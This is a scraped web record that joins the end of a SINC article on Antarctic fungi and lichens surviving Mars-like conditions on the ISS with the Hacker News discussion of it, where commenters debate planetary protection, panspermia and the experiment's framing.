planet, where strong winds scour away even snow and ice. Only so-called cryptoendolithic microorganisms, capable of surviving in cracks in rocks, and certain lichens can withstand such harsh climatological conditions. A few years ago a team of European researchers travelled to these remote valleys to collect samples of two species of cryptoendolithic fungi: Cryomyces antarcticus and Cryomyces minteri. The aim was to send them to the International Space Station (ISS) for them to be subjected to Martian conditions and space to observe their responses. The tiny fungi were placed in cells (1.4 centimetres in diameter) on a platform for experiments known as EXPOSE-E, developed by the European Space Agency to withstand extreme environments. The platform was sent in the Space Shuttle Atlantis to the ISS and placed outside the Columbus module with the help of an astronaut from the team led by Belgian Frank de Winne. For 18 months half of the Antarctic fungi were exposed to Mars-like conditions. More specifically, this is an atmosphere with 95% CO2, 1.6% argon, 0.15% oxygen, 2.7% nitrogen and 370 parts per million of H2O; and a pressure of 1,000 pascals. Through optical filters, samples were subjected to ultra-violet radiation as if on Mars (higher than 200 nanometres) and others to lower radiation, including separate control samples. “The most relevant outcome was that more than 60% of the cells of the endolithic communities studied remained intact after ‘exposure to Mars’, or rather, the stability of their cellular DNA was still high,” highlights Rosa de la Torre Noetzel from Spain’s National Institute of Aerospace Technology (INTA), co-researcher on the project. Section of rock colonised by cryptoendolithic microorganisms and the Cryomyces fungi in quartz crystals under an electron microscope. / S. Onofri et al. The scientist explains that this work, published in the journal ‘Astrobiology’, forms part of an experiment known as the Lichens and Fungi Experiment (LIFE), “with which we have studied the fate or destiny of various communities of lithic organisms during a long-term voyage into space on the EXPOSE-E platform.” “The results help to assess the survival ability and long-term stability of microorganisms and bioindicators on the surface of Mars, information which becomes fundamental and relevant for future experiments centred around the search for life on the red planet,” states De la Torre. Also lichens from Gredos and the Alps Researchers from the LIFE experiment, coordinated from Italy by Professor Silvano Onofri from the University of Tuscany, have also studied two species of lichens (Rhizocarpon geographicum and Xanthoria elegans) which can withstand extreme high-mountain environments. These have been gathered from the Sierra de Gredos (Avila, Spain) and the Alps (Austria), with half of the specimens also being exposed to Martian conditions. Another range of samples (both lichens and fungi) was subjected to an extreme space environment (with temperature fluctuations of between -21.5 and +59.6 ºC, galactic-cosmic radiation of up to 190 megagrays, and a vacuum of between 10-7 to 10-4 pascals). The effect of the impact of ultra-violet extraterrestrial radiation on half of the samples was also examined. After the year-and-a-half-long voyage, and the beginning of the experiment on Earth, the two species of lichens ‘exposed to Mars’ showed double the metabolic activity of those that had been subjected to space conditions, even reaching 80% more in the case of the species Xanthoria elegans. The results showed subdued photosynthetic activity or viability in the lichens exposed to the harsh conditions of space (2.5% of samples), similar to that presented by the fungal cells (4.11%). In this space environment, 35% of fungal cells were also seen to have kept their membranes intact, a further sign of the resistance of Antarctic fungi. The EXPOSE-E platform, where Antarctic fungi and lichens are placed, and members of the team before sending it to the International Space Station. / S. Onofri et al. References: Silvano Onofri, Jean-Pierre de Vera, Laura Zucconi, Laura Selbmann, Giuliano Scalzi, Kasthuri J. Venkateswaran, Elke Rabbow, Rosa de la Torre, Gerda Horneck. “Survival of Antarctic Cryptoendolithic Fungi in Simulated Martian Conditions On Board the International Space Station”. Astrobiology 15(12): 1052-9, December 2015. DOI: 10.1089/ast.2015.1324. Source: SINC Copyright: Creative Commons For media only: If you are a journalist and would like to contact the researchers, please register as a journalist in SINC. TAGS ISS fungi lichens astrobiology Related articles Publícalo en Facebook The mystery of the Hubble constant The measurements of the expansion of the universe don't add up Enrique Sacristán Physicists use two types of measurements to calculate the expansion rate of the universe, but their results do not coincide, which may make it necessary to touch up the cosmological model. “It's like trying to thread a cosmic needle,” explains researcher Licia Verde of the University of Barcelona, co-author of an article on the implications of this problem. Publícalo en Facebook Wormhole echoes that may revolutionize Astrophysics SINC The scientific collaborations LIGO and Virgo have detected gravitational waves from the fusion of two black holes, inaugurating a new era in the study of the cosmos. But what if those ripples of space-time had not produced by black holes, but by other exotic objects? A team of European physicists offer an alternative: wormholes, which can be traversed to appear in another universe. Most viewed “Ahora podemos saber cómo los dinosaurios veían, oían y olían el mundo” Un análisis de sangre revela características de la covid persistente Mala calidad del sueño e insomnio entre los jóvenes que toman bebidas energéticas Una dieta rica en ácidos grasos de cadena corta mejora la supervivencia de los pacientes con mieloma múltiple Las aguas subterráneas se agotan de forma acelerada en todo el planeta El helicóptero Ingenuity de la NASA finaliza su misión en Marte Luz verde al primer observatorio de ondas gravitacionales en el espacio La sonda japonesa que aterrizó en la Luna espera su reactivación Japón explica el accidentado alunizaje de su nave SLIM La evolución de las bacterias puede ser predecible Share Publish Creative Commons License Follow us Creative Commons 4.0 You can copy, distribute and transform the contents of SINC. Read the conditions of our license Close alert Suscríbete al boletín semanal Recibe cada semana los contenidos más relevantes de la actualidad científica. He leído y acepto el aviso legal y la política de privacidad, así como la información de protección de datos DINOSAURIOS ONDAS GRAVITACIONALES RINOCERONTES BACTERIAS SÍFILIS Iberoamérica Opinión Ciencia Salud Innova Tierra Tecnología Sociedad Iberoamérica Opinión Ciencia Salud Innova Tierra Tecnología Sociedad Visual Especiales MagaSINC Claves Suscripción boletín Agenda Sobre sinc El equipo Reconocimientos FAQ Contacto Si estás registrado No podrás conectarte si excedes diez intentos fallidos. Email Contraseña Recuérdame ¿Has olvidado tu contraseña? Entrar Si todavía no estás registrado La Agencia SINC ofrece servicios diferentes dependiendo de tu perfil. Selecciona el tuyo: Periodistas Instituciones Queremos saber tu opinión Por favor, ten en cuenta qu SINC no es consultorio de salud. Para este tipo de consejos, acude a un servicio médico. Nombre* Email* Comentar* Quiero recibir una notificación por email cuando alguien responda a mi comentario Acepto las normas de uso No soy un robot Enviar Se ha producido un error Lo sentimos, Inténtalo de nuevo más tarde. . Contacto Hemeroteca FAQ Enlaces de la ciencia Mapa del sitio Qué es SINC Licencia CC El equipo Colaboradores Reconocimientos Contacto Hemeroteca FAQ Enlaces de la ciencia Mapa del sitio Qué es SINC Licencia CC El equipo Colaboradores Reconocimientos SÍGUENOS EN Política de cookies Accesibilidad Aviso legal y Política de privacidad Desarrollado con eZ PublishTM",
    "commentLink": "https://news.ycombinator.com/item?id=39168900",
    "commentBody": "Antarctic fungi survive Martian conditions on the International Space Station (agenciasinc.es)202 points by chuckhend 14 hours agohidepastfavorite129 comments pixelesque 11 hours agoNote that while the cultures were outside the Space Station, they were in containers simulating the conditions of Mars, so it doesn't seem like they were in the vacuum of Space itself, unless I've missed something in the article? reply seabass-labrax 11 hours agoparentI think you're right: the atmosphere inside the container was artificial and intended to be equivalent to the atmosphere on Mars, with natural light from the Sun allowed to pass into the container through filters which also emulated the conditions on Mars. reply dotancohen 11 hours agorootparentIf I'm not mistaken Mars' atmospheric is pressure is less than 1% of the Earth's atmospheric pressure. That is a lot closer to a vacuum than it is to Earth conditions. reply seabass-labrax 11 hours agorootparentIndeed; one of the things I like best about the Ingenuity helicopter (sadly decommissioned only this week) is that it flew at a pressure that, were it on Earth rather than Mars, would be equivalent to twice as high as Concorde's cruising altitude! reply JumpCrisscross 11 hours agorootparentprev> Mars' atmospheric is pressure is less than 1% of the Earth's atmospheric pressure 0.0060 atm (0.6%), to be exact [1]. [1] https://en.wikipedia.org/wiki/Atmosphere_of_Mars reply KronisLV 10 hours agorootparentFollowing that link, I stumbled upon these two: https://en.wikipedia.org/wiki/Atmospheric_escape https://en.wikipedia.org/wiki/Future_of_Earth What an interesting, but harrowing existence to be a part of. I don't expect humanity to last that long, but even if we did, then those would be quite the obstacles. reply cyberlurker 6 hours agorootparentI did not know in 600 million years trees would basically go extinct. Even if it is an incredibly far away time, I wonder what the gradual process will be. reply baxtr 1 hour agorootparentWhat a depressing thought even if it’s still far away. Life itself started about 3.5 bn years ago. So we’re well beyond the half-time of life on this planet. reply hannasanarion 11 hours agorootparentprevmore like 4%, but yeah. reply smusamashah 11 hours agoprevWhy does we go through so much trouble to not let mars etc get polluted by life from earth, why don't we just send a bug chunk of hardcore life forms like this fungi and others on the red planet etc and go back later to see how they are fairing? What are we trying to find or learn that life from earth will permanently remove the chance of? reply eganist 10 hours agoparent> What are we trying to find or learn that life from earth will permanently remove the chance of? Species prove to be invasive all the time on earth when exposed to new ecosystems or environments, and usually that's at the expense of many potential discoveries about the life forms that are replaced. Seeding the universe with life from our planet may make sense as a survival strategy, but there's no ceiling to the knowledge we can glean from life thats different from our own. In short: we don't know what we don't know, and the gains from such knowledge could be endless. reply smusamashah 10 hours agorootparentSo one of the things we are trying to learn is if there are other type of life forms than what we know from earth. What if do find something, there are no big size living things there but if did find some microbial Mars/X native life form, will we just let that be? Won't we still try to put ourselves there anyway? that's what we do on current planet being top of the food chain. reply throwup238 10 hours agorootparentYeah the whole safety dance is a bit of a farce. Everyone is willing to play along with the ethical considerations now because there's currently zero value to the Moon and Mars but if we had the technology and industrial capacity to start sending thousands of colonists, those rules would probably be discarded with much haste. reply pests 9 hours agorootparentSounds like AI alignment reply 14u2c 6 hours agorootparentprevThis is not about about some microbe conservation effort. The whole idea is to preserve the conditions in which life can be discovered, and if it is, studied. Think about how much harder it would be to detect Mars life if organic molecules from Earth are present in quantity, let alone the interaction that could occur. reply WalterBright 8 hours agorootparentprev> will we just let that be? Why should we? Microbes are not sentient. reply irrational 8 hours agorootparentprevAt what point do we determine there is no more to be learned so terraforming efforts can start? reply WalterBright 8 hours agorootparentprevPerhaps we are the only life in the universe. It would be a pity to have the earth destroyed and that is all gone, because we were so terrified of spreading life around. > the gains from such knowledge could be endless. Could be - but the gains from spreading Terran life around will be endless. Besides, Mars is a lifeless hulk. reply deadbabe 7 hours agorootparentprevIf life in the universe is actually really rare, isn’t it irresponsible for us to not be seeding life anywhere we can put it? If we put microbes on several planets and moons in the solar system those worlds could have complex and even intelligent lifeforms in millions of years. reply shagie 10 hours agoparentprevThe part of NASA that is charged with this mission - https://sma.nasa.gov/sma-disciplines/planetary-protection From there, https://journals.asm.org/doi/10.1128/aem.33.2.379-384.1977 is \"Microbiological profiles of the Viking spacecraft\" Note things like: > Approximately 1,300 colonies were picked from culture plates, identified, lypholipized, and stored for future reference. About 75% of all isolates were microorganisms considered indigenous to humans; the remaining isolates were associated with soil and dust in the environment. So that if we do encounter that particular strain on Mars, we'll know its from Earth. --- One that's on the interesting side and has more than just an available abstract: Europa Clipper planetary protection probabilistic risk assessment summary https://www.sciencedirect.com/science/article/abs/pii/S00320... reply ufo 10 hours agoparentprevFor starters it becomes harder to find martian life. The earth life could kill the martian life before we get a chance to find it. Also, if the experiments detect signs of life, we won't be able to know if it's from martian life or from the earth life we brought along. reply thret 5 hours agoparentprevI don't know either. We could limit exposure to a tiny patch on the planet's surface and still have ample opportunity to look for signs of life on the rest of it. reply janosdebugs 10 hours agoparentprevWe only have one petri dish planet close by. No control, and the experiment takes a very long time. reply dyno12345 7 hours agoparentprevnitpick: fungi don't produce their own food; they need something to eat. what you need to get an ecosystem going is photosynthetic or chemotrophic organisms that produce their own food. reply WalterBright 8 hours agoparentprevWe should be dumping a bag of extremophiles into the atmosphere of every body we can. reply yanko 13 hours agoprevThere is controversial opinion that previous space station MIR was abandoned due to deadly fungi plague spread all over the station reply ceejayoz 13 hours agoparentThat's on the inside, though. The ISS has to mitigate mold as well. https://newspaceeconomy.ca/2023/03/29/mold-in-space-the-hidd... has a picture of a wall panel covered in the stuff after astronauts hung damp workout clothes out to dry. reply Loughla 13 hours agorootparentThat just makes sense. A sealed environment full of human would tend towards fungus. reply ratg13 5 hours agorootparentprevThis was on the outside https://www.permaculturenews.org/2017/03/27/aggressive-fungu... reply ceejayoz 4 hours agorootparentNo, it wasn't. That's the author misreading their source; see the second paragraph. Nothing in that article supports the first paragraph's assertion. reply ratg13 13 minutes agorootparentI actually hadn't heard of this before and googled it and this was the first article that came up. Thank you for the correction. reply sitkack 10 hours agoparentprevWell it was made out of plywood. Unless they made the wood poisonous to all life, it is also food. And humans basically exhale the rest of what fungi need to thrive. Space is not all that inhospitable to life. There are strong theories that after major cataclysms on earth, rocks in space with life attached then reseeded earth when they came back down. reply ceejayoz 10 hours agorootparentMir being made of plywood is a… new claim on me. Got more info? reply jujube3 8 hours agorootparentThe front fell off. reply lawlessone 13 hours agoprevI've heard on panspermia in relation to Earth. But what are the odds an asteroid hitting Earth has already seeded life elsewhere in the solar system? reply explorigin 13 hours agoparentAstronomically low. (I'll see myself out.) reply hnarn 13 hours agoparentprevReminds me of a really interesting video Kurzgesagt posted recently: https://m.youtube.com/watch?v=JOiGEI9pQBs reply JumpCrisscross 11 hours agorootparentThe habitable epoch, when \"the cosmic microwave background (CMB) had a temperature of 273–373 K (0–100 °C), allowing early rocky planets (if any existed) to have liquid water chemistry on their surface and be habitable, irrespective of their distance from a star,\" has always fascinated me [1]. Space itself was room temperature. Our universe would seem to them like the universe on the verge of heat death does to us. To my knowledge, I don't know of any fiction that explores this setting--it's on my bucket list to write. [1] https://lweb.cfa.harvard.edu/~loeb/habitable.pdf reply samplatt 5 hours agorootparentI'm having troubles following the math on that paper. If the beginning of the Habitable Epoch was 10-17MY after the big bang, when was the end? reply hnarn 1 hour agorootparentNot strictly an answer to your question regarding the math, but the video I linked above does mention an estimate for how long the period might have been. reply 7thaccount 10 hours agoparentprevI first read about this ages ago as a kid and was fascinated. I never figured it was probable though. Years later I'm finding it more and more likely in my completely worthless and undereducated opinion. It'd be crazy to eventually find out that many planets out there have similar DNA. I read something by a SETI researcher that pointed out that some research focuses on finding DNA outside of earth (e.g. Mars) that has the reversed chirality of DNA on earth (i.e. corkscrews the opposite way of all life we've found on earth). This would be an incredibly strong indicator for life that actually came from somewhere else and wasn't just contaminated from DNA from earth that got on the equipment. They said \"strong\" instead of \"certain\" as it's still possible for a \"shadow biome\" on earth where the chirality is reversed that we just haven't found yet. This is important as there is no reason that it should be one way or the other (at least that scientists are currently aware of). As far as they can tell it should be 50:50, so chirality makes for an interesting indicator. Note: this is what I read over a decade ago. I'm no biologist. reply xyzzy_plugh 10 hours agorootparentAlternatively non-orientable wormholes would produce the same effects. Would be cool either way! reply fnordpiglet 13 hours agoparentprevWhy does an asteroid have to hit the earth? Life is constantly being shed from the upper atmosphere into space right now. As we travel through space we leave a plume of life behind us. Certainly almost none of it survives, but almost isn’t none, and a lot of life spreads as hardened spores that can withstand extreme conditions until more favorable conditions present and they “wake up.” reply crazygringo 13 hours agorootparent> Life is constantly being shed from the upper atmosphere into space right now. As we travel through space we leave a plume of life behind us. Can you point to any source for that? I've never heard of such a thing and can't find anything from a quick online search supporting that idea. Everything I read is that gravity will pull back any bacteria that get to the outer edges of the atmosphere, which makes sense because they'd need to have some force stronger than gravity to escape. What information can you point to that supports the idea that we leave a \"plume of life behind us\"? I think the idea behind an asteroid is that only something with that level of force could eject bacteria that could overcome the Earth's gravity to escape. Edit: atmospheric escape [1] is a well-known phenomenon, but that's exclusively about gases, at the molecular level. It doesn't mention anything about bacteria, which are of course massive in comparison -- the factors that can cause a single atom or molecule to gain enough energy to escape gravity don't apply to things the size of bacteria. [1] https://en.wikipedia.org/wiki/Atmospheric_escape reply londons_explore 13 hours agorootparentI suspect the conclusion here depends entirely on upper atmosphere winds which I don't think are well studied. reply lupire 12 hours agorootparentUpper atmosphere winds are well within the Earth's gravity well. Relative to the center of the Earth (average gravity) , the atmosphere ends approximately at sea level. Small particles aren't escaping based on their own velocity from random collisions. Maybe from interplanetary scraft like Voyager. reply JumpCrisscross 11 hours agorootparentprev> that's exclusively about gases, at the molecular level Impact erosion seems like it would have enough energy to eject microbes from the atmosphere given the amount of life in the troposphere [1]. [1] https://nautil.us/the-surprising-importance-of-stratospheric... reply londons_explore 11 hours agorootparentprevThe chance of a particle escaping depends on its mass. That's why helium escapes pretty fast. The other gas molecules still escape, but far far slower. The Maxwell Boltzmann distribution applies. Something like a virus is far far heavier again, so the rate of escape would be miniscule. Not sure if it's small enough to have never happened across the surface of earth though. reply bongodongobob 11 hours agorootparentprevNonsense. How are microbes exceeding Earth's escape velocity? reply cncovyvysi 11 hours agorootparentSolar wind? (Genuine question) reply orbital-decay 8 hours agoparentprevThere was that ISS experiment during multiple spacewalks that discovered marine microorganisms on the outer surface of the space station that got there somehow, many of them surviving the conditions. It's hard to explain by the contamination alone because some species were endemic to the places well outside the trajectory of the launchers. The authors suggest/speculate about the existence of some ionospheric updraft or electromagnetic phenomenon capable of elevating them to the upper thermosphere where ISS is located. If that's true, panspermia hypothesis suddenly becomes much less far-fetched, and also the \"reverse panspermia\" you're talking about. https://www.hindawi.com/journals/tswj/2018/7360147/ - one of the papers related to the experiment https://nplus1.ru/material/2020/02/21/iss-test-experiment - a pop-sci article and an interview with a PI of that experiment (in Russian, use a translator) reply downrightmike 11 hours agoparentprevAfter the big bang, there was likely many millions of years where the universe was a comfortable temperature that would have allowed life to evolve there first. Which eventually cooled and died out until it met the right conditions. Probably why space smells like burnt food \"Other astronauts have described it in similar yet varying ways: \"burning metal,\" \"a distinct odor of ozone, an acrid smell,\" \"walnuts and brake pads,\" \"gunpowder\" and even \"burnt almond cookie.\" \" https://science.howstuffworks.com/space-smell.htm#:~:text=Ot... reply dotancohen 11 hours agorootparentBut during that time, the elements necessary for life as we know it did not yet exist. reply 867-5309 11 hours agorootparentwhich time would that be? reply candiodari 11 hours agorootparentprev\"electrical smell\", \"burnt almond cookie\" is the smell people who survived report HCN to have. And it's not that space is full of a lethal-on-touch gas, that's the smell your nerves report when the sensory cells are dying faster than they can pass on a chemical signal. reply resolutebat 12 hours agoparentprevTerence McKenna's theory was that human intelligence stems from psilocybin-containing mushroom spores hitching a ride on asteroids. Then again, he also wrote a lot about the self-transforming machine elves he met while stoned out of his gourd on DMT. reply JumpCrisscross 10 hours agorootparent> Terence McKenna's theory was that human intelligence stems from psilocybin-containing mushroom spores The Stoned ape theory \"has largely been rejected by the scientific community, who cite numerous alleged discrepancies within his theory and claim that his conclusions were arrived at via a fundamental misunderstanding of Fischer's studies\" on \"psychedelic drugs, schizophrenia, the perception-hallucination continuum model of altered states of consciousness, and...gustation\" [1][2]. [1] https://en.wikipedia.org/wiki/Stoned_ape_theory [2] https://en.wikipedia.org/wiki/Roland_L._Fischer reply NoPicklez 11 hours agorootparentprevI'd believe both of those things reply sitkack 10 hours agorootparentThe fungi are actually probes sent from an ancient civilization, a root kit for life it finds to make it take to the stars. reply adolph 13 hours agoparentprevOne of the main ideas explained in this video is that the very early universe (i.e. the universe “right after the Big Bang” in cosmic timescales) might have been habitable for a short period of time. During this time window, the right temperature to support life wouldn’t have been restricted to the proximity of stars, but would have instead taken place absolutely everywhere in space due to the intrinsic temperature of the universe itself. https://sites.google.com/view/sources-big-bang-life/ https://youtu.be/JOiGEI9pQBs?si=kOHM_l0saPkEhWcX reply nkrisc 12 hours agorootparentWe often think about life arising in one location and then spreading across the galaxy or universe. Quite interesting to consider instead life arising everywhere and then being reduced to only a few (maybe one) remaining pockets across the entire universe, or not at all. Of course that likely doesn’t apply to life as we know it, assuming our estimates of the age of the sun and the universe are correct. reply anonymouskimmer 13 hours agorootparentprev> The second one is an observation about the rate at which the different genomes on Earth have changed over evolutionary history. When extrapolated back into the past, this evolution rate of genomes suggests that the current lineage of life on Earth might be at least 10 billion years old, I wonder to what extent the scientists who study these evolutionary clocks are able to factor in increasingly (or decreasingly) capable DNA replication and repair mechanisms. More faithful DNA replication and repair would artificially show a slower rate of genome evolution. reply adolph 12 hours agorootparentIt sometimes sounds the state of the art is headed there, see Cronin et al regarding “Assembly theory explains and quantifies selection and evolution” https://www.nature.com/articles/s41586-023-06600-9 reply s1artibartfast 11 hours agorootparentprevMy understanding is the time when the universe was at life supporting temperatures, was long before the formation of the first stars and fusion of heavier atoms than hydrogen. It is hard to imagine life without a large variety of atoms. reply JumpCrisscross 10 hours agorootparent> the time when the universe was at life supporting temperatures, was long before the formation of the first stars and fusion of heavier atoms than hydrogen Stars with rocky planets during the habitable epoch \"lie ∼8.5 standard deviations (σ) away on the exponential tail of the Gaussian probability distribution of initial density perturbations,\" though \"their abundance could have been significantly enhanced by primordial non-Gaussianity.\" [1] https://arxiv.org/pdf/1312.0613.pdf reply s1artibartfast 10 hours agorootparentInteresting! It Sounds like the paper supports my statement as a generalization, but explores extreme outliers in stellar formation. It sounds like there is a chance some atomic fusion could have occurred at this time, but It would be isolated to a few instances in our light cone. This is a pretty different than the entire universe awash in favorable conditions to life. reply ThinkBeat 7 hours agoprevI am no biologist; I am unclear about the terms here. Let say I have a piece of bread that has mold on it. I leave it alone, the mold grows and consumes more of the bread. The mold / fungi is \"alive\" in that it is growing and consuming. Let us say that the fungi here was from moldy bread. They shoot it into space, stuff it inside the lab and expose it to the same environment. Does survival then mean that it keeps eating more of the bread while the experiment is taking place, so when they look at it afterwards there is a lot more of it? But 40% of it has died? Or does it mean that the cells making up the mold are entirely dormant but is the DNA structure has remained intact for 60% of the mold and the hypothesis is that if you brought it back to earth it would start \"being alive\", growing, eating again? >The most relevant outcome was that more than 60% of the cells of the endolithic communities studied remained intact after ‘exposure to Mars’, or rather, the stability of their cellular DNA was still high,” reply stephenitis 6 hours agoparentArm chair guessing here. If they were spores, they would test to see if the spores were viable. If it was the mycelium body they would see if it was still viable to grow. reply ceeam 12 hours agoprevThe ISS is well within the Earth magnetic shield for starters. Almost no radiation, compared to real outer space. reply thejackgoode 11 hours agoparentIs that why they sent Scott Kelly for a year up there and then compared him to his twin? reply tecleandor 9 hours agoprevBy the way, this article should be tagged (2016) The paper, from 2015: https://doi.org/10.1089%2Fast.2015.1324 reply oh_my_goodness 11 hours agoprev\"Survives\" appears in the original title but ... “The most relevant outcome was that more than 60% of the cells of the endolithic communities studied remained intact after ‘exposure to Mars’, or rather, the stability of their cellular DNA was still high,” highlights Rosa de la Torre Noetzel from Spain’s National Institute of Aerospace Technology (INTA), co-researcher on the project. reply fbdab103 9 hours agoparentIt only takes a single success to propagate a species. Sustained with a food source, presumably you could select for a new species which can survive the radiation and near vacuum. reply MicolashKyoka 13 hours agoprevif a protomolecule ever comes to be, it's going to be some sort of fungi-based lifeform. reply plonk 13 hours agoparentIs that an Expanse reference or does the word mean something else in biology? reply andrewflnr 12 hours agorootparentIt definitely doesn't mean anything in real science. reply MicolashKyoka 8 hours agorootparentprevit is! but I meant the idea of it, ie self-replicating biological programs that could be hurled through space and be used for terraforming. reply belter 13 hours agoparentprevTell me about it .... reply jimmytucson 13 hours agoprevIt’s my understanding that fungi eat dead organic matter. So what did these fungi eat and was it included in the “Mars-like” environment? reply gravelc 12 hours agoparentSome fungi require dead organic matter for survival - necrotrophs. Many dont (e.g. yeast) reply emporas 10 hours agorootparentIt is saprophytic if i am not mistaken. Saprophytic means: it eats dead plants. Necrotroph means: it kills a plant, and then eats the dead plant. I have heard the term saprophytic many times, always related to fungi, but it's the first time i have heard the term necrotroph. My browser's spell correction underlines it with red like a word not spelled right. It is probably a new term. reply wongarsu 12 hours agoparentprevIn the context of these experiments the fungi don't really have to do anything in this Mars-like environment, except surviving. Many fungi can do that quite well by going in a dormant state. If you want to take these results to extrapolate whether there could be living and \"thriving\" fungi on Mars right now: there are radiotrophic fungi that can extract energy from ionizing (and possibly non-ionizing) radiation. There could also be fungi capable of chemosynthesis, the production of sugar and amino acids using oxidation reactions as a fuel source. reply joshuamcginnis 12 hours agoparentprevThe fungi used were lichenous and affixed to mars-like and moon-like substrata, not unlike the stone-like environments they were originally sourced from in Antarctica. reply arisAlexis 13 hours agoprevCan someone ELI5 the significance of this for non space scifi geeks ? reply Sharlin 12 hours agoparentIf even some hardy Earth organisms can survive (the article doesn't say anything about it, but this was almost certainly survival in a dormant desiccated state rather than being metabolically active doing fungus things) Martian conditions, it slightly raises the odds that whatever microbial life Mars may have once hosted may still exist in protected, hard-to-reach spots – possibly hundreds of meters beneath the surface like a surprising amount of Earth life. It also slightly raises the odds that genetically modified fungi and lichen might be able to metabolize and grow on Mars at least if suitably protected, which may have implications on astronaut food and oxygen production as well as, much more speculatively, terraforming. Further, it has implications on planetary protection – the measures we take to avoid accidentally infesting other worlds with Earth life. reply joshuamcginnis 12 hours agoparentprevLichens found in extreme environments on Earth (rocks in Antarctica) were sent to space and exposed to the elements. Some survived. reply dotancohen 11 hours agorootparent...and exposed to the lack of elements reply SalmoShalazar 12 hours agoparentprevSome fungi can survive the conditions of space, which is pretty incredible. I think that’s basically it. reply jancsika 12 hours agorootparent> Some fungi can survive the conditions of space, which is pretty incredible. It is literally incredible, and the title is misleading. The fungi was in some kind of box that was filled with a lot of CO2, a little O2 and H2O, and other stuff to simulate the atmosphere on Mars. That box was then placed outside the space station. It wouldn't survive if it was just growing in space, outside the space station. Believe me, I'm outside of it right now and it is not going to be fun[1]. 1: I'm about to start doing my taxes-- blecch-- here on Earth, which is technically outside of the space station. reply nvahalik 7 hours agoprevAre they affected by radiation? reply 082349872349872 14 hours agoprevsee also https://en.wikipedia.org/wiki/Lichen#Ecological_interactions reply urza 10 hours agoprevWell of course it does. reply arcosdev 12 hours agoprevThe fungi of Yuggoth! reply tagami 8 hours agoprevFrom 2016... reply lgkk 13 hours agoprevI would like to believe we were put here by a super advanced species so they could observe what we do for their entertainment and research purposes. Why else would people for example keep ant colonies in their home or grow kits? Hopefully we are not alone and they come back soon. I have many questions. reply ithkuil 12 hours agoparentOur ants may have many questions too but we don't seem to understand whether they even have questions and we may not even know how to start engaging with them to answer them. Surely they don't seem to respond to our level of intelligence, so we should adapt to their level in order to tell them something they can understand. But if we achieve that, will the ants really perceive us as a higher level of intelligence? We would clearly stumble our way to approximate a communication channel the best possible way with them and use the feedback to learn how to get better at communicating, but that may take a lot of effort on our side because we may always assume we \"bottomed out\" their intelligence level and that's pointless to continue probing. I now ask you to imagine an analogy with a species that is as smarter, bigger, more powerful and radically different from us as we are to ants. reply brnt 12 hours agoparentprevI don't think ants want their kid 'owner' to come back soon to see how they struggle when it floods the nest. For science. reply kleiba 14 hours agoprevUnsurprisingly - I've seen similar stuff many times in various sci-fi horror movies. reply axxl 14 hours agoparentSomeone's going to make this comment when time travel is invented. reply kleiba 14 hours agorootparentOh, it has been invented already. I specifically came back in time to make the above comment... reply aspenmayer 13 hours agorootparentWe’re all living in John Titor’s world. https://en.wikipedia.org/wiki/John_Titor reply datadeft 13 hours agorootparentprevOur current understanding it that you can only travel forward in time. Could you explain how to do it backward? reply johnchristopher 13 hours agoparentprevReminds me of Warren Ellis Super god comics: https://i.pinimg.com/736x/a8/9c/a5/a89ca5a914ff4574548862af4... reply lawlessone 13 hours agoparentprevI recall in one of the Asimovs Foundation books there was a fungus like substance that forced the crew to fly close to a star to kill it off. reply marcellus23 13 hours agorootparentThat doesn't sound like Foundation to me. Are you sure it was from that series? reply anonymouskimmer 13 hours agorootparentYes, it was. Not the original series though. It's in Foundation and Earth: https://en.wikipedia.org/wiki/Foundation_and_Earth#Part_V:_M... reply sitkack 10 hours agorootparentprevThat is why we are warm blooded, we operate too hot for fungi to thrive. reply jareklupinski 10 hours agoparentprevSpace Brie: Our Most Delicious Enemy reply jupp0r 13 hours agoprevSubmission title is misleading (and not the article title). Fungi did not survive in space outside the ISS, but in a pressurized environment designed to be similar to the surface of Mars. reply quatrefoil 13 hours agoparentI'm a bit perplexed about experiments like that. I get it why we did a lot of this in the early years of the Space Age to validate our assumptions about the hazards of outer space. Then, there was some scientific curiosity about how certain life forms, such as complex plants or insects, might adopt to near-zero gravity. This was a bit harder to justify in practical terms, but interesting and hard to replicate by other means. But what's the objective with this test? We can easily recreate similar conditions (pressure, temperature, illumination) here on Earth. So what have we learned to justify the cost? I'm not trolling, it's a sincere question. reply BurningFrog 12 hours agorootparentThe one thing we can't replicate on Earth is low gravity. reply quatrefoil 12 hours agorootparentSure, but there's no reason to suspect that low gravity does anything interesting to fungi, of all things; and there's ample evidence that it doesn't from previous experiments, intentional and not. Other comments cite instances of the crews dealing with mold on the ISS. reply throwaway8877 13 hours agoparentprevI wonder then how possible it is that some of the spores got settled in Mars and we have already contaminated Mars with Earth fungi. reply jupp0r 12 hours agorootparentThe equipment that has been sent to Mars has been sterilized in cleanroom conditions. Interplanetary contamination is something that space agencies take super seriously. reply fluoridation 11 hours agorootparentprevFungi have metabolisms similar to those of animals. They eat dead biomass, breathe oxygen, and drink water. Mars is a dead planet with a CO2-rich atmosphere and no liquid water. Even if a spore got transported there, it would not be able to germinate. reply anonymouskimmer 4 hours agorootparentMars does indeed have liquid water, and a chance at more of it: https://english.elpais.com/science-tech/2024-01-18/massive-d... : In 2018, Mars Express located a large lake of liquid water under the Martian polar ice. https://web.archive.org/web/20210902121223/https://earthsky.... : There is a chance that this dusty and dark ice might melt a few centimeters down. And any subsurface liquid water produced from melting will be protected from evaporating in Mars’ wispy atmosphere by the overlying blanket of ice. Is it likely that Fungi would end up in the right places on Mars, and even then grow in these conditions? Probably not. But worth investigating given what is known of psychrophilic fungi. https://link.springer.com/article/10.1007/s11157-016-9395-9 : Fungi are able to grow and survive at low temperature and exist widely in polar and non-polar habitats. These cold regions are known for very low temperature, high ultra violet-B radiation, frequent freeze and thaw cycles and low water and nutrient availability. reply mackman 13 hours agoprevWhile I'm sure space truffles are going to be overpriced I am excited to see those little pigs doing EVAs in their little piggy space helmets. reply stephenr 13 hours agoparentSurely the helmet will prevent them from sniffing out the spruffles? reply woleium 13 hours agorootparentWe just keep them around for the vibe, like the plastic twigs in date packets. reply stephenr 13 hours agorootparentThe pigs or the helmets? reply mackman 12 hours agorootparentprevObviously there’s going to have to be some holes so they can smell. reply lupire 12 hours agoprevnext [3 more] Flagged submitter's editorialized false title. reply crazygringo 12 hours agoparentHow do you flag a title? Flagging an article doesn't do anything about the title, but kills virtually all further discussion if it's no longer on the front page -- which doesn't seem desirable. reply dang 9 hours agoparentprevFixed now. Thanks! reply davedx 12 hours agoprev [–] Misleading title reply dang 9 hours agoparentSubmitted title was \"Fungi survives outside international space station\". I've changed it to the article title now. I assume that's a fix? Submitters: \"Please use the 